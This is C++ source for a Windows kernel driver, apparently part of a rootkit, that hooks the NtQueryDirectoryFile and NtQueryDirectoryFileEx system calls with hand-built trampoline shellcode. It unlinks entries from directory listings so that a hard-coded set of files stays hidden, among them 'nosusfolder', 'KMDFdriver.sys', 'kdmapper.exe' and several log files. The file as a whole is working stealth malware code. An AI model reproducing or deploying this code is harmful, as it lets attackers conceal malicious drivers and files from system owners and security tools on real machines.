#pragma once
#pragma warning(disable : 4996)
#include <wdm.h>
#include <intrin.h>



typedef struct _SYSTEM_SERVICE_TABLE{
    PVOID ServiceTableBase;
    PVOID ServiceCounterTableBase;
    ULONG64 NumberOfServices;
    PVOID ParamTableBase;
} SYSTEM_SERVICE_TABLE, * PSYSTEM_SERVICE_TABLE;


PSYSTEM_SERVICE_TABLE KiServiceDescriptorTable = NULL;
PVOID KernelImageBaseAddress = NULL;
BYTE* KernelTextSection = NULL;

const ULONG TrampolineSize = 31;
const ULONG AfterHookOffset = 20;
BYTE QueryDirFileTemplate[TrampolineSize] = { 0x40, 0x53,  // push rbx
                                    0x48, 0x83, 0xec, 0x50,  // sub rsp, 50h
                                    0xf6, 0x9c, 0x24, 0xa0, 0x00, 0x00, 0x00,  // neg byte ptr[rsp + 0A0h]
                                    0x48, 0x8b, 0xda,  // mov rbx, rdx
                                    0x1a, 0xc0,  // sbb al, al
                                    0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, afterhookaddr
                                    0x41, 0xff, 0xe5  // jmp r13 (jmp afterhookaddr)
};
BYTE QueryDirFileExTemplate[TrampolineSize] = { 0x4c, 0x8b, 0xdc,  // mov r11, rsp
                                    0x48, 0x81, 0xec, 0xa8, 0x00, 0x00, 0x00,  // sub rsp, a8h
                                    0x49, 0x8d, 0x43, 0xd9,  // lea rax,[r11 - 27h]
                                    0x49, 0x89, 0x43, 0xd0,  // mov qword ptr [r11-30h],rax
                                    0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, afterhookaddr
                                    0x41, 0xff, 0xe5  // jmp r13 (jmp afterhookaddr)
};


// Default memory pool "arrays" to hold original data of all hooks, will include this original data + jmp afterhookaddr (shellcode itself, in 1809 format):
PVOID OriginalNtQueryDirFile = NULL;
PVOID OriginalNtQueryDirFileEx = NULL;
PVOID ActualNtQueryDirFile = NULL;
PVOID ActualNtQueryDirFileEx = NULL;

const WCHAR* DefaultFileObjs[] = { L"nosusfolder", L"verysus", L"KMDFdriver", L"MainMedium",
                                L"MainMedium.exe", L"KMDFdriver.sys", L"kdmapper.exe",
                                L"MediumLogFile.txt", L"ServiceLog.txt", L"DriverDominance.txt" };
const char* DefaultFileObjsReg[] = { "nosusfolder", "verysus", "KMDFdriver", "MainMedium",
                                "MainMedium.exe", "KMDFdriver.sys", "kdmapper.exe",
                                "MediumLogFile.txt", "ServiceLog.txt", "DriverDominance.txt" };


// Definitions of functions/types:
typedef NTSTATUS(*QueryDirFile)(IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG FileInformationLength,
    IN FILE_INFORMATION_CLASS FileInformationClass,
    IN BOOLEAN ReturnSingleEntry,
    IN PUNICODE_STRING FileName OPTIONAL,
    IN BOOLEAN RestartScan);

typedef NTSTATUS(*QueryDirFileEx)(IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    IN ULONG QueryFlags,
    IN PUNICODE_STRING FileName OPTIONAL);


// Class for handling requested files to hide:
class HideFileObject {
public:
    PVOID HideBuffer = NULL;
    ULONG HideCount = 0;
    ULONG BufferSize = 0;
    char HideDivider = L'|';

    BOOL AddToHideFile(PUNICODE_STRING NewHideName) {
        DWORD Count = NewHideName->Length + sizeof(WCHAR);  // Length does not include nullterminator
        PVOID TempBuffer = NULL;
        if (HideBuffer != NULL) {
            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize, 'HfTb');
            if (TempBuffer == NULL) {
                return FALSE;
            }
            RtlCopyMemory(TempBuffer, HideBuffer, BufferSize);
            ExFreePool(HideBuffer);
            HideBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize + Count + 1, 'HfOl');
            if (HideBuffer == NULL) {
                ExFreePool(TempBuffer);
                return FALSE;
            }
            if (HideBuffer != NULL) {
                RtlCopyMemory(HideBuffer, TempBuffer, BufferSize);
                ExFreePool(TempBuffer);
                RtlCopyMemory((PVOID)((ULONG64)HideBuffer + BufferSize), &HideDivider, 1);
                RtlCopyMemory((PVOID)((ULONG64)HideBuffer + BufferSize + 1), NewHideName->Buffer, Count);
                BufferSize += 1 + Count;  // Divider + next string
            }
            else {
                return FALSE;
            }
        }
        else {
            HideBuffer = ExAllocatePoolWithTag(NonPagedPool, Count, 'HfOl');
            if (HideBuffer == NULL) {
                return FALSE;
            }
            RtlCopyMemory(HideBuffer, NewHideName->Buffer, Count);
            BufferSize += Count;
        }
        HideCount++;
        return TRUE;
    }


    BOOL GetFromHideFile(PUNICODE_STRING HideName, int HideIndex, ULONG* HideOffset) {
        ULONG CurrLength = 0;
        ULONG CurrHide = 0;
        ULONG UnsIndex = 0;
        if (HideIndex < 0) {
            UnsIndex = (ULONG)HideIndex + HideCount;
        }
        else {
            UnsIndex = (ULONG)HideIndex;
        }
        if (HideBuffer == NULL || HideCount == 0 || BufferSize == 0 || HideOffset == NULL) {
            return FALSE;  // Invalid parameters
        }
        if (UnsIndex >= HideCount) {
            return FALSE;
        }
        for (ULONG Index = 0; Index < BufferSize / sizeof(WCHAR); Index++) {
            if (CurrHide == UnsIndex) {
                if (((WCHAR*)HideBuffer)[Index] != L'|') {
                    if (CurrLength == 0) {
                        *HideOffset = Index * sizeof(WCHAR);
                    }
                    CurrLength += sizeof(WCHAR);
                }
                else {
                    break;
                }
            }
            else {
                if (((WCHAR*)HideBuffer)[Index] == L'|') {
                    CurrHide++;
                }
            }
        }
        HideName->Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, CurrLength, 'GfHf');
        if (HideName->Buffer == NULL) {
            return FALSE;
        }
        RtlCopyMemory(HideName->Buffer, (PVOID)((ULONG64)HideBuffer + *HideOffset), CurrLength);
        HideName->Length = (USHORT)CurrLength - sizeof(WCHAR);  // UNICODE_STRING length does not include nullterminator
        HideName->MaximumLength = (USHORT)CurrLength - sizeof(WCHAR);  // UNICODE_STRING length does not include nullterminator
        return TRUE;
    }


    BOOL RemoveFromHideFile(int HideIndex, PUNICODE_STRING RemovedString) {
        UNICODE_STRING Removed = { 0 };
        ULONG NeededOffset = 0;
        ULONG UnsIndex = 0;
        PVOID TempBuffer = NULL;
        if (RemovedString == NULL) {
            RemovedString = &Removed;
        }
        if (HideIndex < 0) {
            UnsIndex = (ULONG)HideIndex + HideCount;
        }
        else {
            UnsIndex = (ULONG)HideIndex;
        }
        if (HideBuffer == NULL || HideCount == 0 || BufferSize == 0) {
            return FALSE;  // Invalid parameters
        }
        if (!GetFromHideFile(RemovedString, (int)UnsIndex, &NeededOffset) || Removed.Buffer == NULL || Removed.Length == 0 || Removed.MaximumLength == 0) {
            return FALSE;
        }
        if (HideCount == 1) {
            ExFreePool(HideBuffer);
            HideBuffer = NULL;
            BufferSize = 0;
            HideCount = 0;
            return TRUE;
        }
        if (UnsIndex == 0) {
            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize - (Removed.Length + 2 * sizeof(WCHAR)), 'RfHf');  // +2 for dividor and nullterminator
            if (TempBuffer == NULL) {
                return FALSE;
            }
            RtlCopyMemory(TempBuffer, (PVOID)((ULONG64)HideBuffer + Removed.Length + 2 * sizeof(WCHAR)), BufferSize - (Removed.Length + 2 * sizeof(WCHAR)));
            ExFreePool(HideBuffer);
            HideBuffer = TempBuffer;
            BufferSize -= (Removed.Length + 2 * sizeof(WCHAR));
            HideCount--;
        }
        else if (UnsIndex == HideCount - 1) {
            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, NeededOffset - sizeof(WCHAR), 'RfHf');  // -1 for the dividor before the removed
            if (TempBuffer == NULL) {
                return FALSE;
            }
            RtlCopyMemory(TempBuffer, HideBuffer, NeededOffset - sizeof(WCHAR));
            ExFreePool(HideBuffer);
            HideBuffer = TempBuffer;
            BufferSize = NeededOffset - sizeof(WCHAR);
            HideCount--;
        }
        else {
            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize - (Removed.Length + 2 * sizeof(WCHAR)), 'RfHf');
            if (TempBuffer == NULL) {
                return FALSE;
            }
            RtlCopyMemory(TempBuffer, HideBuffer, NeededOffset);
            RtlCopyMemory((PVOID)((ULONG64)TempBuffer + NeededOffset), (PVOID)((ULONG64)HideBuffer + NeededOffset + Removed.Length + 2 * sizeof(WCHAR)), BufferSize - (NeededOffset + Removed.Length + 2 * sizeof(WCHAR)));
            ExFreePool(HideBuffer);
            HideBuffer = TempBuffer;
            BufferSize -= (Removed.Length + 2 * sizeof(WCHAR));
            HideCount--;
        }
        return TRUE;
    }
};
HideFileObject HookHide;


// Helper functions:
NTSTATUS InitiateTrampolinePool(ULONG Tag, PVOID* TrampolinePool, ULONG64 AfterHookAddress) {
    switch (Tag) {
    case 'HkQr':
        *TrampolinePool = &OriginalNtQueryDirFile;
        OriginalNtQueryDirFile = ExAllocatePoolWithTag(NonPagedPool, TrampolineSize, 'TePr');
        if (OriginalNtQueryDirFile == NULL) {
            return STATUS_UNSUCCESSFUL;
        }
        RtlCopyMemory(OriginalNtQueryDirFile, QueryDirFileTemplate, TrampolineSize);
        RtlCopyMemory((PVOID)((ULONG64)OriginalNtQueryDirFile + AfterHookOffset), &AfterHookAddress, sizeof(AfterHookAddress));
        break;
    case 'HkQx':
        *TrampolinePool = &OriginalNtQueryDirFileEx;
        OriginalNtQueryDirFileEx = ExAllocatePoolWithTag(NonPagedPool, TrampolineSize, 'TePx');
        if (OriginalNtQueryDirFileEx == NULL) {
            return STATUS_UNSUCCESSFUL;
        }
        RtlCopyMemory(OriginalNtQueryDirFileEx, QueryDirFileExTemplate, TrampolineSize);
        RtlCopyMemory((PVOID)((ULONG64)OriginalNtQueryDirFileEx + AfterHookOffset), &AfterHookAddress, sizeof(AfterHookAddress));
        break;
    default: return STATUS_INVALID_PARAMETER;
    }
    return STATUS_SUCCESS;
}


DWORD CompareAgainstFiles(PUNICODE_STRING SearchString) {
    UNICODE_STRING CurrentFile = { 0 };
    if (SearchString == NULL || SearchString->Buffer == NULL || 
        SearchString->Buffer[0] == L'.' && (SearchString->Buffer[1] == L'\0' || (SearchString->Buffer[1] == L'.' && SearchString->Buffer[2] == L'\0'))) {
        return 9999;  // SearchString is current/last directory
    }
    for (int ListIndex = 0; ListIndex < sizeof(DefaultFileObjs) / sizeof(const WCHAR*); ListIndex++) {
        RtlInitUnicodeString(&CurrentFile, DefaultFileObjs[ListIndex]);
        if (general_helpers::CompareUnicodeStringsADD(&CurrentFile, SearchString, 0)) {
            return ListIndex;
        }
    }
    return 9999;
}


void SearchForInitialEvilDir(PUNICODE_STRING Name, BOOL* IsRoot, BOOL* IsSame, DWORD Checks) {
    USHORT DirIndex = 0;

    if (Checks >= 1) {
        if (strlen("\\nosusfolder") * (sizeof(WCHAR) / sizeof(char)) <= Name->Length) {
            *IsRoot = FALSE;  // Only other case in which changed should be made, to hide nosusfolder in SystemRoot
            for (DirIndex = 0; DirIndex < strlen("nosusfolder") && *IsSame; DirIndex++) {
                if (DefaultFileObjs[0][DirIndex] != Name->Buffer[DirIndex + 1]) {
                    *IsSame = FALSE;
                }
            }
            if (*IsSame) {
                if (!(Name->Buffer[DirIndex + 1] == L'\0' || Name->Buffer[DirIndex + 1] == L'\\')) {
                    *IsSame = FALSE;  // Make sure that directories like nosusfolder1 wont get labeled as evil
                }
            }
        }
        else {
            *IsSame = FALSE;
            if (Checks >= 2) {
                if (!((Name->Length == sizeof(WCHAR) && Name->Buffer[0] == L'\\') || (Name->Length == sizeof(WCHAR) * 2 && Name->Buffer[0] == L'\\' && Name->Buffer[1] == L'\0'))) {
                    *IsRoot = FALSE;  // Only other case in which changed should be made, to hide nosusfolder in SystemRoot
                }
            }
        }
    }
}


BOOL IsToHideRequest(PUNICODE_STRING RequestedDir, PUNICODE_STRING CurrentFile) {
    UNICODE_STRING CurrentHidden = { 0 };
    ULONG CurrentHideOffs = 0;
    int BackSlash = -1;
    int diri = 0;
    for (ULONG hiddeni = 0; hiddeni < HookHide.HideCount; hiddeni++) {
        HookHide.GetFromHideFile(&CurrentHidden, hiddeni, &CurrentHideOffs);
        for (int namei = 0; namei < CurrentHidden.Length / sizeof(WCHAR); namei++) {
            if (CurrentHidden.Buffer[namei] == L'\\') {
                BackSlash = namei;
                break;
            }
        }
        if (BackSlash == -1) {
            if (general_helpers::CompareUnicodeStringsADD(CurrentFile, &CurrentHidden, 0)) {
                DbgPrintEx(0, 0, "KMDFdriver Hooking - General file name to hide found (directory %wZ, file %wZ)\n", RequestedDir, CurrentFile);
                return TRUE;  // General file name, block all instances
            }
            continue;
        }
        else {
            if (general_helpers::ComparePathFileToFullPathADD(&CurrentHidden, RequestedDir, CurrentFile)) {
                DbgPrintEx(0, 0, "KMDFdriver Hooking - File path + name in linked list = one of the to-hide paths (%wZ + %wZ = %wZ)\n", RequestedDir, CurrentFile, &CurrentHidden);
                return TRUE;  // If file path + name in linked list = one of the to-hide paths
            }


            // Check if path starts with hiding path to verify last case of exact/inner request for hidden file/folder:
            if (CurrentHidden.Length >= RequestedDir->Length) {
                for (diri = 0; diri < RequestedDir->Length / sizeof(WCHAR); diri++) {
                    if (RequestedDir->Buffer[diri] != CurrentHidden.Buffer[diri]) {
                        break;
                    }
                }
                if (diri == RequestedDir->Length / sizeof(WCHAR)) {
                    DbgPrintEx(0, 0, "KMDFdriver Hooking - File/folder to hide starts/is equal to RequestedDir (FullPath %wZ, RequestedDir %wZ)\n", &CurrentHidden, RequestedDir);
                    return TRUE;  // Comparison got to the end of RequestDir - until the end, it was equal
                }
            }
        }
        BackSlash = -1;
    }
    return FALSE;
}


// Macro for iterating over files in NtQueryDirectory/Ex:
NTSTATUS IterateOverFiles(FILE_INFORMATION_CLASS FileInfoClass, PVOID FileInformation, IO_STATUS_BLOCK* DirStatus, BOOL* IsDirSame, PUNICODE_STRING RequestedDir, BOOL* IsSystemRoot, PUNICODE_STRING SusFolder, PUNICODE_STRING FunctionName) {
    ULONG FileCount = 0;
    ULONG IndexDecr = 0;
    UNICODE_STRING CurrentFile = { 0 };

    PFILE_ID_BOTH_DIR_INFORMATION PreviousBothId = { 0 };
    PFILE_ID_BOTH_DIR_INFORMATION CurrBothId = { 0 };
    PFILE_BOTH_DIR_INFORMATION PreviousBoth = { 0 };
    PFILE_BOTH_DIR_INFORMATION CurrBoth = { 0 };
    PFILE_ID_FULL_DIR_INFORMATION PreviousFullId = { 0 };
    PFILE_ID_FULL_DIR_INFORMATION CurrFullId = { 0 };
    PFILE_FULL_DIR_INFORMATION PreviousFull = { 0 };
    PFILE_FULL_DIR_INFORMATION CurrFull = { 0 };


    // Cast parameters and call by type:
    switch (FileInfoClass) {
    case FileIdBothDirectoryInformation:
        CurrBothId = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
        PreviousBothId = CurrBothId;
        while ((ULONG64)CurrBothId != (ULONG64)PreviousBothId || FileCount == 0) {
            CurrBothId->FileIndex -= IndexDecr;
            CurrentFile.Buffer = CurrBothId->FileName;
            CurrentFile.Length = (USHORT)CurrBothId->FileNameLength;
            CurrentFile.MaximumLength = (USHORT)CurrBothId->FileNameLength;  
            if (*IsDirSame || general_helpers::CompareUnicodeStringsADD(&CurrentFile, SusFolder, 0) && *IsSystemRoot || IsToHideRequest(RequestedDir, &CurrentFile)) {
                if (CurrBothId->NextEntryOffset == 0) {
                    if (FileCount == 0) {
                        DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                        DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ BOTHID,SINGLE: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                        DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                        FileInformation = NULL;
                        DirStatus->Status = STATUS_NO_SUCH_FILE;
                        return STATUS_NO_SUCH_FILE;
                    }
                    // Last file in the linked list:
                    PreviousBothId->NextEntryOffset = 0;
                }
                else {
                    PreviousBothId->NextEntryOffset = PreviousBothId->NextEntryOffset + CurrBothId->NextEntryOffset;
                }
                DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ BOTHID: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                IndexDecr++;
            }
            FileCount++;
            PreviousBothId = CurrBothId;
            CurrBothId = (PFILE_ID_BOTH_DIR_INFORMATION)((ULONG64)CurrBothId + CurrBothId->NextEntryOffset);
        }
        break;

    case FileBothDirectoryInformation:
        CurrBoth = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
        PreviousBoth = CurrBoth;
        while ((ULONG64)CurrBoth != (ULONG64)PreviousBoth || FileCount == 0) {
            CurrBoth->FileIndex -= IndexDecr;
            CurrentFile.Buffer = CurrBoth->FileName;
            CurrentFile.Length = (USHORT)CurrBoth->FileNameLength;
            CurrentFile.MaximumLength = (USHORT)CurrBoth->FileNameLength;
            if (*IsDirSame || general_helpers::CompareUnicodeStringsADD(&CurrentFile, SusFolder, 0) && *IsSystemRoot || IsToHideRequest(RequestedDir, &CurrentFile)) {
                if (CurrBoth->NextEntryOffset == 0) {
                    if (FileCount == 0) {
                        DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                        DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ BOTH,SINGLE: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                        DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                        FileInformation = NULL;
                        DirStatus->Status = STATUS_NO_SUCH_FILE;
                        return STATUS_NO_SUCH_FILE;
                    }
                    // Last file in the linked list:
                    PreviousBoth->NextEntryOffset = 0;
                }
                else {
                    PreviousBoth->NextEntryOffset = PreviousBoth->NextEntryOffset + CurrBoth->NextEntryOffset;
                }
                DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ BOTH: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                IndexDecr++;
            }
            FileCount++;
            PreviousBoth = CurrBoth;
            CurrBoth = (PFILE_BOTH_DIR_INFORMATION)((ULONG64)CurrBoth + CurrBoth->NextEntryOffset);
        }
        break;

    case FileIdFullDirectoryInformation:
        CurrFullId = (PFILE_ID_FULL_DIR_INFORMATION)FileInformation;
        PreviousFullId = CurrFullId;
        while ((ULONG64)CurrFullId != (ULONG64)PreviousFullId || FileCount == 0) {
            CurrFullId->FileIndex -= IndexDecr;
            CurrentFile.Buffer = CurrFullId->FileName;
            CurrentFile.Length = (USHORT)CurrFullId->FileNameLength;
            CurrentFile.MaximumLength = (USHORT)CurrFullId->FileNameLength;
            if (*IsDirSame || general_helpers::CompareUnicodeStringsADD(&CurrentFile, SusFolder, 0) && *IsSystemRoot || IsToHideRequest(RequestedDir, &CurrentFile)) {
                if (CurrFullId->NextEntryOffset == 0) {
                    if (FileCount == 0) {
                        DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                        DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ FULLID,SINGLE: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                        DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                        FileInformation = NULL;
                        DirStatus->Status = STATUS_NO_SUCH_FILE;
                        return STATUS_NO_SUCH_FILE;
                    }
                    // Last file in the linked list:
                    PreviousFullId->NextEntryOffset = 0;
                }
                else {
                    PreviousFullId->NextEntryOffset = PreviousFullId->NextEntryOffset + CurrFullId->NextEntryOffset;
                }
                DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ FULLID: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                IndexDecr++;
            }
            FileCount++;
            PreviousFullId = CurrFullId;
            CurrFullId = (PFILE_ID_FULL_DIR_INFORMATION)((ULONG64)CurrFullId + CurrFullId->NextEntryOffset);
        }
        break;

    case FileFullDirectoryInformation:
        CurrFull = (PFILE_FULL_DIR_INFORMATION)FileInformation;
        PreviousFull = CurrFull;
        while ((ULONG64)CurrFull != (ULONG64)PreviousFull || FileCount == 0) {
            CurrFull->FileIndex -= IndexDecr;
            CurrentFile.Buffer = CurrFull->FileName;
            CurrentFile.Length = (USHORT)CurrFull->FileNameLength;
            CurrentFile.MaximumLength = (USHORT)CurrFull->FileNameLength;  
            if (*IsDirSame || general_helpers::CompareUnicodeStringsADD(&CurrentFile, SusFolder, 0) && *IsSystemRoot || IsToHideRequest(RequestedDir, &CurrentFile)) {
                if (CurrFull->NextEntryOffset == 0) {
                    if (FileCount == 0) {
                        DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                        DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ FULL,SINGLE: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                        DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                        FileInformation = NULL;
                        DirStatus->Status = STATUS_NO_SUCH_FILE;
                        return STATUS_NO_SUCH_FILE;
                    }
                    // Last file in the linked list:
                    PreviousFull->NextEntryOffset = 0;
                }
                else {
                    PreviousFull->NextEntryOffset = PreviousFull->NextEntryOffset + CurrFull->NextEntryOffset;
                }
                DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ FULL: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                IndexDecr++;
            }
            FileCount++;
            PreviousFull = CurrFull;
            CurrFull = (PFILE_FULL_DIR_INFORMATION)((ULONG64)CurrFull + CurrFull->NextEntryOffset);
        }
        break;
    default: return STATUS_INVALID_PARAMETER;
    }
    return STATUS_SUCCESS;
}